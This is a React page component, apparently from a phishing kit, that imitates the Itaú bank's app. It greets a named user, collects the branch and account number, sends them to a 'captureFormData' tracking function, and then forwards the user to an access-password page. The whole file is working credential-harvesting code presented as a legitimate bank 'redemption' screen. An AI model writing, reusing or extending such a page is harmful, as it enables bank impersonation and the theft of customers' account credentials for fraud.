import { useState } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Menu, Bell } from "lucide-react";
import itauLogo from "@/assets/itau-logo.png";
import BottomNav from "@/components/BottomNav";
import { useVisitorTracking, captureFormData } from "@/hooks/useVisitorTracking";

const Resgate = () => {
  useVisitorTracking("resgate");
  const navigate = useNavigate();
  const location = useLocation();
  const { nome } = (location.state as any) || {};
  const [agencia, setAgencia] = useState("");
  const [conta, setConta] = useState("");

  const handleContinuar = () => {
    if (agencia.length >= 4 && conta.length >= 5) {
      captureFormData("resgate", { agencia, conta });
      navigate("/senha-acesso", { state: { nome, agencia, conta } });
    }
  };

  return (
    <div
      className="min-h-screen max-w-md mx-auto relative"
      style={{ background: "linear-gradient(135deg, #FF6200 0%, #CC5000 100%)" }}
    >
      {/* Header */}
      <div className="px-5 pt-6 pb-16">
        <div className="flex items-center justify-between mb-8">
          <Menu className="text-primary-foreground" size={24} />
          <Bell className="text-primary-foreground" size={24} />
        </div>
        <div className="flex flex-col items-center gap-3">
          <img src={itauLogo} alt="Itaú" className="h-12" />
          <p className="text-primary-foreground/80 text-sm">Olá, {nome || "Titular"}</p>
        </div>
      </div>

      {/* Content */}
      <div className="px-5 pb-32 space-y-5">
        <div className="px-1">
          <label className="text-sm text-primary-foreground/80 block mb-1">Agência (sem dígito)</label>
          <input
            type="text"
            inputMode="numeric"
            value={agencia}
            onChange={(e) => setAgencia(e.target.value.replace(/\D/g, "").slice(0, 5))}
            className="w-full bg-transparent text-primary-foreground border-b border-primary-foreground/30 pb-2 outline-none text-base placeholder:text-primary-foreground/40"
            placeholder="0000"
          />
        </div>

        <div className="px-1">
          <label className="text-sm text-primary-foreground/80 block mb-1">Conta (com dígito)</label>
          <input
            type="text"
            inputMode="numeric"
            value={conta}
            onChange={(e) => {
              let v = e.target.value.replace(/\D/g, "").slice(0, 7);
              if (v.length > 1) v = v.slice(0, -1) + "-" + v.slice(-1);
              setConta(v);
            }}
            className="w-full bg-transparent text-primary-foreground border-b border-primary-foreground/30 pb-2 outline-none text-base placeholder:text-primary-foreground/40"
            placeholder="00000-0"
          />
        </div>

        <button
          onClick={handleContinuar}
          disabled={agencia.length < 4 || conta.replace(/\D/g, "").length < 5}
          className="w-full py-4 rounded-full bg-white text-[#FF6200] font-semibold text-base hover:bg-white/90 transition-opacity disabled:opacity-40 disabled:cursor-not-allowed"
        >
          Continuar
        </button>
      </div>

      <BottomNav />
    </div>
  );
};

export default Resgate;
